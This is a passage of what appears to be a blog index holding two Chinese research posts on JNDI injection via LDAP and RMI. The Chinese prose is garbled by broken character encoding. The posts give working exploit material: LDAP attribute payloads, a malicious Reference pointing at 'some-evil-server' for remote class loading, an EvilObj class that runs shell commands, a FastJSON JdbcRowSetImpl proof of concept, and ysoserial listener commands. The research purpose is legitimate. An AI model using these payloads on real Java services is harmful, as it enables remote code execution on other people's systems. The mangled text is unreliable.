è·Ÿè¿›com/sun/jndi/ldap/Obj.java#decodeObjectï¼ŒæŒ‰ç…§è¯¥å‡½æ•°çš„æ³¨é‡Šæ¥çœ‹ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯è§£ç ä»LDAP Serveræ¥çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯èƒ½æ˜¯åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªReferenceå¯¹è±¡ã€‚å…³äºåºåˆ—åŒ–å¯¹è±¡çš„å¤„ç†ï¼Œæˆ‘ä»¬çœ‹åé¢ä¸€èŠ‚ã€‚è¿™é‡Œæ‘˜å–äº†Referenceçš„å¤„ç†æ–¹å¼ï¼š 1234567891011121314static Object decodeObject(Attributes attrs) throws NamingException &#123; Attribute attr; // Get codebase, which is used in all 3 cases. String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE])); try &#123; // ... attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);// \"objectClass\" if (attr != null &amp;&amp; (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || // \"javaNamingReference\" attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123; // \"javanamingreference\" return decodeReference(attrs, codebases); &#125; //... å¦‚æœLDAP Serverè¿”å›çš„å±æ€§é‡ŒåŒ…æ‹¬äº†objectClasså’ŒjavaNamingReferenceï¼Œå°†è¿›å…¥Referenceçš„å¤„ç†å‡½æ•°decodeReferenceä¸Š 12345678910111213if ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != null) &#123; className = (String)attr.get();&#125; else &#123; throw new InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] + \" attribute is required\");&#125;if ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != null) &#123; factory = (String)attr.get();&#125;Reference ref = new Reference(className, factory, (codebases != null? codebases[0] : null)); decodeReferenceå†ä»å±æ€§ä¸­æå–å‡ºjavaClassNameå’ŒjavaFactoryï¼Œæœ€åå°†ç”Ÿæˆä¸€ä¸ªReferenceã€‚è¿™é‡Œå¦‚æœçœ‹è¿‡æˆ‘å‰é¢çš„é‚£ç¯‡jndi-with-rmiï¼Œå¯ä»¥çœ‹åˆ°å…¶å®è¿™é‡Œç”Ÿæˆçš„refå°±æ˜¯æˆ‘ä»¬åœ¨RMIè¿”å›çš„é‚£ä¸ªReferenceWrapperï¼Œåé¢è¿™ä¸ªrefå°†ä¼šä¼ é€’ç»™Naming Managerå»å¤„ç†ï¼ŒåŒ…æ‹¬ä»codebaseä¸­è·å–classæ–‡ä»¶å¹¶è½½å…¥ã€‚ è€Œè¿™é‡ŒLDAPä¹Ÿç±»ä¼¼ï¼Œå¤„ç†refçš„å¯¹è±¡æ˜¯NamingManagerçš„å­ç±»javax/naming/spi/DirectoryManager.javaï¼Œå› ä¸ºè·ŸRMIæœ‰ç‚¹ç±»ä¼¼ä¸å…·ä½“åˆ†æäº†ï¼Œæœ€ååŒæ ·ç”±javax/naming/spi/NamingManager.java#getObjectFactoryFromReferenceæ¥å¤„ç†ã€‚ åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å†æ¥çœ‹mbechler å®ç°çš„LDAPRefServerå°±æ¯”è¾ƒæ¸…æ¥šäº† å½“å…¶è·å–åˆ°LDAPè¿æ¥æ—¶ï¼Œå°†å¡«å……å¦‚ä¸Šçš„å‡ ä¸ªå±æ€§åŠå…¶å¯¹åº”çš„å€¼ï¼Œå°±æ˜¯ä¸ºäº†æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶è€Œç”Ÿæˆä¸€ä¸ªReferenceå¯¹è±¡ã€‚ 0x03 LDAP with Serialized ObjectJNDIå¯¹äºå±æ€§ä¸­çš„åºåˆ—åŒ–æ•°æ®çš„å¤„ç†ä¸€å…±æœ‰ä¸¤ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬å…ˆæ¥é¡ºç€å‰é¢çš„JNDI Referenceçš„æ€è·¯è¯´ä¸‹å» ç¬¬ä¸€å¤„ï¼šcom/sun/jndi/ldap/Obj.java#decodeObjectåœ¨com/sun/jndi/ldap/Obj.java#decodeObjectä¸Šè¿˜å­˜åœ¨ä¸€ä¸ªåˆ¤æ–­ 1234if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) &#123;// â€œjavaSerializedDataâ€ ClassLoader cl = helper.getURLClassLoader(codebases); return deserializeObject((byte[])attr.get(), cl);&#125; å¦‚æœåœ¨è¿”å›çš„å±æ€§ä¸­å­˜åœ¨javaSerializedDataï¼Œå°†ç»§ç»­è°ƒç”¨deserializeObjectå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸»è¦å°±æ˜¯è°ƒç”¨å¸¸è§„çš„ååºåˆ—åŒ–æ–¹å¼readObjectå¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œè¿˜åŸï¼Œå¦‚ä¸‹payloadã€‚ 12345@Overrideprotected void processAttribute(Entry entry)&#123; entry.addAttribute(\"javaClassName\", \"foo\"); entry.addAttribute(\"javaSerializedData\", serialized);&#125; è¿™é‡Œæˆ‘ä»¬å°±ä¸éœ€è¦é€šè¿‡è¿œç¨‹codebaseçš„æ–¹å¼æ¥è¾¾æˆRCEï¼Œå½“ç„¶é¦–å…ˆæœ¬åœ°ç¯å¢ƒä¸Šéœ€è¦æœ‰ååºåˆ—åŒ–åˆ©ç”¨é“¾æ‰€ä¾èµ–çš„åº“æ–‡ä»¶ã€‚ ç¬¬äºŒå¤„ï¼šcom/sun/jndi/ldap/Obj.java#decodeReferencedecodeReferenceå‡½æ•°åœ¨å¯¹æ™®é€šçš„Referenceè¿˜åŸçš„åŸºç¡€ä¸Šï¼Œè¿˜å¯ä»¥è¿›ä¸€æ­¥å¯¹RefAddressåšè¿˜åŸå¤„ç†ï¼Œå…¶ä¸­è¿˜åŸè¿‡ç¨‹ä¸­ï¼Œä¹Ÿè°ƒç”¨äº†deserializeObjectå‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬é€šè¿‡æ»¡è¶³RefAddressçš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°ä¸Šé¢ç¬¬ä¸€ç§çš„æ•ˆæœã€‚ å…·ä½“ä»£ç å¤ªé•¿äº†ï¼Œè¿™é‡Œæˆ‘å°±è¯´ä¸€ä¸‹æ¡ä»¶ï¼š ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºåˆ†éš”ç¬¦ ç¬¬ä¸€ä¸ªåˆ†éš”ç¬¦ä¸ç¬¬äºŒä¸ªåˆ†éš”ç¬¦ä¹‹é—´ï¼Œè¡¨ç¤ºReferenceçš„positionï¼Œä¸ºintç±»å‹ ç¬¬äºŒä¸ªåˆ†éš”ç¬¦ä¸ç¬¬ä¸‰ä¸ªåˆ†éš”ç¬¦ä¹‹é—´ï¼Œè¡¨ç¤ºtypeï¼Œç±»å‹ ç¬¬ä¸‰ä¸ªåˆ†éš”ç¬¦æ˜¯åŒåˆ†éš”ç¬¦çš„å½¢å¼ï¼Œåˆ™è¿›å…¥ååºåˆ—åŒ–çš„æ“ä½œ åºåˆ—åŒ–æ•°æ®ç”¨base64ç¼–ç  æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶ï¼Œæ„é€ ä¸€ä¸ªç±»ä¼¼çš„ 12345protected void processAttribute(Entry entry)&#123; entry.addAttribute(\"javaClassName\", \"foo\"); entry.addAttribute(\"javaReferenceAddress\",\"$1$String$$\"+new BASE64Encoder().encode(serialized)); entry.addAttribute(\"objectClass\", \"javaNamingReference\"); //$NON-NLS-1$&#125; å½“ç„¶ç¬¬äºŒå¤„åªæ˜¯ä¸€ä¸ªé”¦ä¸Šæ·»èŠ±çš„æ­¥éª¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ç¬¬ä¸€ç§æ–¹æ³•ï¼Œç¬¬äºŒç§åœ¨ç¬¬ä¸€ç§ä¸èƒ½ç”¨çš„æƒ…å†µä¸‹å¯ä»¥è¯•è¯•ã€‚ 0x04 åç»­è‡ªjdk8u191-b02ç‰ˆæœ¬åï¼Œæ–°æ·»åŠ äº†com.sun.jndi.ldap.object.trustURLCodebaseé»˜è®¤ä¸ºfalseçš„é™åˆ¶ï¼Œä¹Ÿå°±æ„å‘³ç€è¿œç¨‹codebaseçš„Referenceæ–¹å¼è¢«é™åˆ¶æ­»äº†ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡SerializedDataçš„æ–¹æ³•æ¥è¾¾æˆåˆ©ç”¨ã€‚ æˆ‘ä»¬æ¥æ•´ç†ä¸€ä¸‹ï¼Œå…³äºjndiçš„ç›¸å…³å®‰å…¨æ›´æ–° JDK 6u132, JDK 7u122, JDK 8u113ä¸­æ·»åŠ äº†com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºfalseã€‚ å¯¼è‡´jndiçš„rmi referenceæ–¹å¼å¤±æ•ˆï¼Œä½†ldapçš„referenceæ–¹å¼ä»ç„¶å¯è¡Œ Oracle JDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å com.sun.jndi.ldap.object.trustURLCodebaseå±æ€§çš„é»˜è®¤å€¼è¢«è°ƒæ•´ä¸ºfalseã€‚ å¯¼è‡´jndiçš„ldap referenceæ–¹å¼å¤±æ•ˆï¼Œåˆ°è¿™é‡Œä¸ºæ­¢ï¼Œè¿œç¨‹codebaseçš„æ–¹å¼åŸºæœ¬å¤±æ•ˆï¼Œé™¤éè®¤ä¸ºè®¾ä¸ºtrue è€Œåœ¨æœ€æ–°ç‰ˆçš„jdk8uä¸Šï¼Œjndi ldapçš„æœ¬åœ°ååºåˆ—åŒ–åˆ©ç”¨é“¾1å’Œ2çš„æ–¹å¼ä»ç„¶æœªå¤±æ•ˆï¼Œjndi rmiåº•å±‚(JRMPListener)StreamRemoteCallçš„æœ¬åœ°åˆ©ç”¨æ–¹å¼ä»æœªå¤±æ•ˆã€‚ æ‰€ä»¥å¦‚æœReferenceçš„æ–¹å¼ä¸è¡Œçš„æ—¶å€™ï¼Œå¯ä»¥è¯•è¯•åˆ©ç”¨æœ¬åœ°ClassPathé‡Œçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æ¥è¾¾æˆRCEã€‚ 0x05 æ€»ç»“JNDIå’ŒLDAPçš„ç»“åˆï¼Œå‡ºç°äº†2ç§åˆ©ç”¨æ–¹å¼ï¼Œä¸€æ˜¯åˆ©ç”¨è¿œç¨‹codebaseçš„æ–¹å¼ï¼ŒäºŒæ˜¯åˆ©ç”¨æœ¬åœ°ClassPathé‡Œçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚åœ¨æœ€æ–°ç‰ˆçš„jdk8uä¸­ï¼Œcodebaseçš„æ–¹å¼ä¾èµ–com.sun.jndi.ldap.object.trustURLCodebaseçš„å€¼ï¼Œè€Œç¬¬äºŒç§æ–¹å¼ä»æœªå¤±æ•ˆã€‚ LDAPçš„ä½¿ç”¨æ–¹æ³•é™¤äº†JNDIçš„lookupï¼Œå…¶ä»–çš„åº“ä¹Ÿä¼šæœ‰ç›¸åº”çš„ä½¿ç”¨æ–¹æ³•ï¼Œå¦‚Springçš„ldapï¼Œè¿™é‡Œè¿˜å¯ä»¥ç»§ç»­æ·±å…¥ä¸‹å»ï¼Œå…ˆæŒ–ä¸ªå‘XD æœ€åï¼Œä¸Šé¢çš„ä¸¤ä¸ªldap Serveræ›´æ–°åˆ°äº†githubä¸Šï¼Œè‡ªå–XD"},{"title":"ã€notesã€‘JNDI with RMI","permalink":"http://blog.0kami.cn/2020/02/09/jndi-with-rmi/","text":"0x00 å‰è¨€åœ¨ç°å®ç¯å¢ƒä¸­ï¼Œé‡åˆ°RMI Registryçš„æœºä¼šå¾ˆå°‘ï¼Œè€Œç»“åˆååºåˆ—åŒ–æ¼æ´çš„JNDIæ³¨å…¥åˆ™å¸¸è§äº†è®¸å¤šã€‚æœ¬æ–‡å°†ä»‹ç»RMIç»“åˆJNDIåå¯ä»¥åšå“ªäº›äº‹æƒ…XD 0x01 åŸºç¡€åœ¨çœ‹JNDIåŒRMIçš„åˆ©ç”¨å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å…³äºRMIåŠ¨æ€ç±»åŠ è½½çš„æ¦‚å¿µã€‚ RMIåŠ¨æ€ç±»åŠ è½½RMIæœ‰ä¸€ä¸ªé‡è¦çš„ç‰¹æ€§æ˜¯åŠ¨æ€ç±»åŠ è½½æœºåˆ¶ï¼Œå½“æœ¬åœ°CLASSPATHä¸­æ— æ³•æ‰¾åˆ°ç›¸åº”çš„ç±»æ—¶ï¼Œä¼šåœ¨æŒ‡å®šçš„codebaseé‡ŒåŠ è½½classã€‚codebaseå¯ä»¥åœ¨ç³»ç»Ÿå±æ€§java.rmi.server.codebaseè®¾ç½®å…¶URLã€‚å¦‚æœcodebaseçš„URLå¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è½½å…¥ä»»æ„çš„classæˆ–jaræ–‡ä»¶ã€‚æ ¹æ®Pç‰›çš„Javaå®‰å…¨æ¼«è°ˆ- RMIç¯‡ä¸­æåˆ°ï¼Œé€šè¿‡ä¿®æ”¹ä¼ é€’è¿‡ç¨‹ä¸­çš„åºåˆ—åŒ–æ•°æ®ï¼Œå°†å…¶ä¸­çš„codebaseä¿®æ”¹ä¸ºæ¶æ„çš„serverï¼Œè¿™æ ·å¯ä»¥è¾¾åˆ°RMI Serverç«¯è¢«æ”»å‡»çš„æ•ˆæœã€‚ä¸è¿‡ï¼Œè¿™ä¸ªåˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œå¹¶ä¸”oracleåœ¨åé¢å¯¹å…¶åšäº†é™åˆ¶ï¼Œå¦‚æœè¦æˆåŠŸåˆ©ç”¨éœ€è¦æ»¡è¶³å¦‚ä¸‹è¦æ±‚ï¼š å®‰è£…å¹¶é…ç½®äº†SecurityManager Javaç‰ˆæœ¬ä½äº7u21ï¼Œ6u45æˆ–è€…è®¾ç½®äº†java.rmi.server.useCodebaseonly=false æ‘˜è‡ªJavaå®‰å…¨æ¼«è°ˆ-RMIç¯‡ å…¶ä¸­ä¸Šé¢çš„é…ç½®ï¼Œåœ¨7u21ï¼Œ6u45åçš„ç‰ˆæœ¬é‡Œé»˜è®¤ä¸ºtrueï¼Œé‚£ä¹ˆä¹Ÿå°±æ— æ³•ä»è¿œç¨‹codebaseä¸­è½½å…¥ç±»ï¼Œé¿å…äº†ä¸Šé¢è¯´çš„è¿™ç§æ”»å‡»çš„å¯èƒ½æ€§ã€‚ JNDIçš„ç›¸å…³æ¦‚å¿µ Java Naming and Directory Interface (JNDI) is a Java API that allows clients to discover and look up data and objects via a name. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf JNDIæ–¹ä¾¿äº†ä¸naming serviceå’ŒDirectory serviceçš„äº¤äº’ï¼Œé€šè¿‡æŒ‡å®šç‰¹å®šçš„URLå³å¯ä¸ä¸åŒçš„æœåŠ¡è¿›è¡Œäº¤äº’ã€‚ç›¸å½“äºå¯¹è¿™äº›æœåŠ¡çš„APIåˆè¿›è¡Œäº†ä¸€æ¬¡å°è£…ä¾›å¼€å‘äººå‘˜ä½¿ç”¨ã€‚å…¶ä¸­JNDIä¸­ä¹Ÿå­˜åœ¨ä¸Šè¿°RMI codebaseçš„åŠ¨æ€åŠ è½½æœºåˆ¶ï¼Œå¹¶ä¸”å…¶é…ç½®åŒåº•å±‚çš„RMIé…ç½®å¹¶ä¸ç›¸å…³ã€‚ ä»ä¸Šè¿°çš„æ„æ¶æ¥çœ‹ï¼ŒåŠ¨æ€åŠ è½½å‘ç”Ÿäºä¸¤ä¸ªéƒ¨åˆ†ï¼ŒNaming Managerå’ŒJNDI SPIã€‚è¿™é‡ŒSPIéƒ¨åˆ†å°±æ˜¯ç›¸å¯¹åº”çš„æœåŠ¡çš„é…ç½®ï¼Œæ¯”å¦‚å‰æ–‡æåˆ°çš„RMIçš„é™åˆ¶å°±æ˜¯SPIéƒ¨åˆ†çš„ã€‚è€ŒNaming Managerä¹Ÿå­˜åœ¨ä¸€ä¸ªåŠ¨æ€åŠ è½½æœºåˆ¶å¹¶ä¸”å…¶åœ¨ä¿®å¤å‰å¹¶æ— é™åˆ¶ï¼Œè¿™é‡ŒNaming Manageréƒ¨åˆ†ç”¨åˆ°çš„æ˜¯JNDIçš„Naming References In order to bind Java objects in a Naming or Directory service, it is possible to use Java serialization to get the byte array representation of an object at a given state. However, it is not always possible to bind the serialized state of an object because it might be too large or it might be inadequate. For such needs, JNDI defined Naming References (or just References from now on) so that objects could be stored in the Naming or Directory service indirectly by binding a reference that could be decoded by the Naming Manager and resolved to the original object. https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf è¿™é‡Œæåˆ°ç”±äºæŸäº›æƒ…å†µä¸èƒ½ç›´æ¥å°†è¿œç¨‹objè¿”å›ï¼Œæ‰€ä»¥JNDIæå‡ºäº†Naming Referencesçš„æ–¹æ³•ï¼Œè¿”å›ç›¸åº”çš„Referenceè€Œä¸è¿”å›å…·ä½“çš„objã€‚ç»Ÿä¸€ç”±JNDIçš„è¯·æ±‚ç«¯å»åŠ è½½æŒ‡å®šçš„åœ°å€ä¸Šçš„objã€‚è¿™é‡ŒåŠ è½½æ–¹æ³•ä¸­å°±åŒ…æ‹¬è¿œç¨‹codebaseçš„æ–¹æ³•ï¼Œæ¥çœ‹ä¸ªä¾‹å­ 1234String FactoryURL = \"http://some-evil-server\";Reference reference = new Reference(\"MyClass\",\"MyClass\",FactoryURL);ReferenceWrapper wrapper = new ReferenceWrapper(reference);ctx.bind(\"Foo\", wrapper);// ç»‘å®šreference è¯·æ±‚ç«¯ä»¥lookupè¯·æ±‚ä¸Šè¿°ç»‘å®šçš„RMIæœåŠ¡å³å¯ã€‚å…¶å¤„ç†è¿‡ç¨‹å¼•ç”¨https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf 0x02 åŸç†JNDI with RMI DEMOä¸ºäº†æ›´å¥½çš„è¯´æ˜ï¼Œä»¥ä¸‹é¢çš„ä»£ç ä¸ºä¾‹ 1234567891011121314151617181920212223package train.jndi;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;/** * @author wh1t3P1g * @since 2020/2/4 */public class Server &#123; public static void main(String[] args) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1099); String FactoryURL = \"http://localhost/\"; Reference reference = new Reference(\"EvilObj\",\"EvilObj\",FactoryURL); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(\"Foo\", wrapper); &#125;&#125; Serverç«¯ä»¥RMI Registryæ³¨å†Œä¸€ä¸ªReferenceï¼Œå¹¶å°†factoryURLæŒ‡å®šä¸ºlocalhost 123456789101112131415package train.jndi;import javax.naming.Context;import javax.naming.InitialContext;/** * @author wh1t3P1g * @since 2020/2/4 */public class Client &#123; public static void main(String[] args) throws Exception &#123; Context ctx = new InitialContext(); ctx.lookup(\"rmi://localhost:1099/Foo\"); &#125;&#125; Clientç«¯æ¯”è¾ƒç®€å•ï¼Œç›´æ¥ä»¥lookupæŒ‡å®šçš„RMI URLå³å¯ã€‚æ ¹æ®ä¸Šé¢çš„è¿‡ç¨‹å›¾ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“çš„æ˜¯æœ€ç»ˆæ‰§è¡ŒEvilObjçš„åœ°æ–¹æ˜¯Clientç«¯(jndiå‘èµ·lookupçš„æ–¹æ³•)ã€‚æœ€åæˆ‘ä»¬åˆ›ä¸€ä¸ªEvilObj 123456789101112/** * @author wh1t3P1g * @since 2020/2/4 */public class EvilObj &#123; public EvilObj() throws Exception &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123;\"/bin/sh\", \"-c\", \"open /System/Applications/Calculator.app\"&#125;; rt.exec(commands); &#125;&#125; javac EvilObj.javaç”ŸæˆEvilObj.classï¼Œç„¶åæŒ‚è½½åˆ°ä¸€ä¸ªwebæœåŠ¡ä¸Šå°±å¯ä»¥äº†ã€‚å¯ä»¥ç›´æ¥é€‰æ‹©pythonæ¥æŒ‚è½½ é‚£ä¹ˆæˆ‘ä»¬æ¥å…·ä½“çœ‹ä¸€ä¸‹lookupå‡½æ•°å…·ä½“åšäº†ä»€ä¹ˆ é¦–å…ˆInitialContextçš„lookupå‡½æ•°ï¼Œä¼šæ ¹æ®æä¾›çš„URLè‡ªåŠ¨é€‰æ‹©åˆé€‚çš„InitialContextï¼ˆåˆ†ç¦»å‡ºåè®®åè¿›è¡Œé€‰æ‹©ï¼‰ï¼Œæ¯”å¦‚æ­¤æ—¶çš„InitialContextä¸ºrmiURLContext ç»§ç»­è·Ÿè¿›com/sun/jndi/toolkit/url/GenericURLContext.java#lookup è¿™é‡Œçš„ctxä¸ºRegistryContextï¼Œå°†å¯¹æŒ‡å®šçš„RMI Registryè·å–ç»‘å®šçš„obj è·å–åˆ°è¿œç¨‹å¯¹è±¡ï¼Œå¹¶è°ƒç”¨decodeObjectå‡½æ•° å¦‚æœå½“å‰çš„remoteå¯¹è±¡æ˜¯RemoteReferenceç±»å‹ï¼Œåˆ™è¿›ä¸€æ­¥è¯·æ±‚Registryè·å–è¯¥Referenceçš„å†…å®¹ã€‚åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„è¯·æ±‚å°±åŒServerç«¯çš„å…³ç³»ä¸å¤§äº†ï¼ŒClientä¼šæ ¹æ®æ‹¿åˆ°çš„Referenceè¯·æ±‚ç›¸åº”çš„æœåŠ¡å™¨ ç»§ç»­è·Ÿè¿›getObjectInstance è¿™é‡Œä¼šç»§ç»­è°ƒç”¨NamingManagerçš„getObjectFactoryFromReferenceï¼Œè¯¥å‡½æ•°å®Œæˆäº†å‘FactoryURLè¯·æ±‚å…·ä½“çš„classæ–‡ä»¶çš„åŠŸèƒ½ã€‚ è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæ ¹æ®factoryNameå’Œcodebaseå°†è¿œç¨‹è½½å…¥ç›¸åº”çš„classæ–‡ä»¶(è¿™é‡Œçš„loadClassç”¨çš„URLClassLoaderæ¥å®Œæˆä»»åŠ¡) å¹¶åœ¨ç¬¬163è¡Œå¯¹è½½å…¥çš„objè¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æŠŠpayloadå†™åœ¨æ„é€ å‡½æ•°é‡Œã€‚ åœ¨åˆ©ç”¨ä¸­ï¼Œlookupå‡½æ•°çš„å‚æ•°å¿…é¡»æ˜¯å¯æ§çš„ï¼Œæˆ–è€…åˆ©ç”¨ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„æ–¹å¼æ¥å®Œæˆï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¸¤ä¸ªæ¡ˆä¾‹ æ¡ˆä¾‹ä¸€ï¼šSpringæ¡†æ¶çš„JtaTransactionManagerç±»16å¹´çš„æ—¶å€™Springæ¡†æ¶æš´äº†ä¸€ä¸ªååºåˆ—åŒ–çš„å¯åˆ©ç”¨ç‚¹JtaTransactionManagerï¼Œå…¶åŸç†å°±æ˜¯åˆ©ç”¨äº†JNDI å¯æ§çš„lookupå‚æ•°ï¼ˆè¿™é‡Œçš„å¯æ§ç”±ååºåˆ—åŒ–æ¥å®Œæˆï¼‰ã€‚æ¥çœ‹ä¸€ä¸‹åŸç† org/springframework/transaction/jta/JtaTransactionManager.java#readObject è¿™é‡Œ1230è¡Œåˆå§‹åŒ–äº†ä¸€ä¸ªjdniçš„contextï¼Œè¿™ä¸ªcontextå°†ç”¨äºåç»­çš„JNDI lookup ç»§ç»­è·Ÿè¿›initUserTransactionAndTranscationManager ç»§ç»­è·Ÿè¿›lookupUserTransaction è¿™é‡Œæœ€ç»ˆè°ƒç”¨äº†contextçš„lookupå‡½æ•°ï¼Œå¹¶ä¸”å…¶å‚æ•°ä¸ºuserTransactionNameï¼Œè¿™ä¸ªéƒ¨åˆ†æˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å‰è¿›è¡Œæ„é€ ï¼Œä¾‹å¦‚ä¸‹é¢çš„ä»£ç (æ›´æ–°åœ¨äº†ysoserialçš„spring3ä¸Š) åˆ°äº†å¦‚ä»Š2020å¹´ï¼Œè¿™ä¸ªç±»çš„åˆ©ç”¨ä»ç„¶å­˜åœ¨äºæœ€æ–°ç‰ˆçš„Spring-txç»„ä»¶ä¸ŠXD æ¡ˆä¾‹äºŒï¼šFastJSONååºåˆ—åŒ–POC JdbcRowSetImplç±»fastjsonç”±äº@typeçš„å­˜åœ¨ï¼Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­ï¼Œå…¶å¯ä»¥å¯¹ä»»æ„æŒ‡å®šçš„å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ï¼Œæ ¹æ®è§„åˆ™è‡ªåŠ¨è°ƒç”¨setter/getteræ¥è¾¾åˆ°å®ä¾‹è¿˜åŸçš„ç›®çš„ã€‚é¦–å…ˆæ¥çœ‹ä¸€ä¸‹POC 1&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/obj\",\"autoCommit\":true&#125; è¿™é‡Œçš„å…³é”®åœ¨äºautoCommitï¼Œæ¥çœ‹ä¸€ä¸‹JdbcRowSetImplçš„setAutoCommitå‡½æ•° è¿™é‡Œå¦‚æœconnä¸ºnullçš„è¯ï¼Œä¼šè°ƒç”¨connectå‡½æ•°ï¼Œçœ‹ä¸€ä¸‹connectå‡½æ•° çœ‹åˆ°è¿™é‡Œç”¨JNDIè¿›è¡Œæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”ç”±äºfastjsonçš„ç‰¹æ€§dataSourceæ˜¯å¯æ§çš„ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ§åˆ¶lookupçš„å‚æ•°ï¼Œå¹¶å‘æ¶æ„çš„serverå‘èµ·JNDIè¿æ¥ã€‚æ ¹æ®å‰æ–‡è¯´çš„åŸç†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å¾—ä¸»æœºæ‰§è¡Œä»»æ„ä»£ç ã€‚ 0x03 ç¯å¢ƒå¤ç°æ”¹é€ JRMPListenerç”±äºJNDIåº•å±‚ç”¨çš„éƒ½æ˜¯RMIçš„ä¸œè¥¿ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å»ºç«‹ä¸€ä¸ªç»‘å®šäº†Referenceçš„RMIæœåŠ¡ï¼Œå¯ä»¥ç›´æ¥æ”¹æ”¹JRMPListenerã€‚ åœ¨RMIéƒ¨åˆ†æ›¾ç»åˆ†æè¿‡JRMPListenerï¼Œå…¶è¿”å›äº†ExceptionalReturnï¼Œä½¿å¾—æ„é€ å¥½çš„Exceptionåœ¨Clientååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤ã€‚è€Œå¯¹äºç»‘å®šReferenceï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ExceptionalReturnä¸ºNormalReturnå¹¶å°†payloadObjectæ”¹ä¸ºReferenceWrapper payloadObjectæ”¹ä¸ºReferenceWrapper ä½†æ˜¯åœ¨å®é™…æµ‹è¯•æ—¶ï¼Œå‘ç°Clientè¯·æ±‚åä¸èƒ½å®Œå…¨é€€å‡ºã€‚å…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ä¸Šé¢çš„ä¾‹å­ ä¸è¿‡è¿™é‡Œå°±è·å–ä¸åˆ°æ˜¯å¦æœ‰è®¿é—®è¿›æ¥ï¼Œæ ¹æ®å®é™…çš„ç¯å¢ƒå–èˆå§XD æ”¹é€ åçš„å·²æ›´æ–°åˆ°githubä¸Š 12345678// å¼€å¯æŒ‚è½½äº†evil classæ–‡ä»¶çš„HTTP Serverjava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.PayloadHTTPServer 80 EvilObj \"open /System/Applications/Calculator.app\"// å¼€å¯RMI Reference Listenerjava -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://localhost/// æˆ–è€…ä½¿ç”¨RMIRefListener2ï¼Œé›†åˆäº†ä¸Šé¢ä¸¤ä¸ªæ­¥éª¤java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 localhost:1099 80 EvilObj \"open /System/Applications/Calculator.app\" FastJSON 1.2.24 RCEè¿™é‡Œæˆ‘ä»¬ä»¥FastJSON 1.2.24ç‰ˆæœ¬çš„RCEä¸ºä¾‹ï¼Œæ¥è¯•éªŒJNDI é¦–å…ˆå¼€å¯ä¸€ä¸ªevil rmi server 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener2 host:1099 80 EvilObj \"touch /tmp/success\" ç”¨vulhubçš„ç¯å¢ƒ åœ¨æœåŠ¡å™¨ç«¯ä¼šæ¥æ”¶åˆ°è¿æ¥ 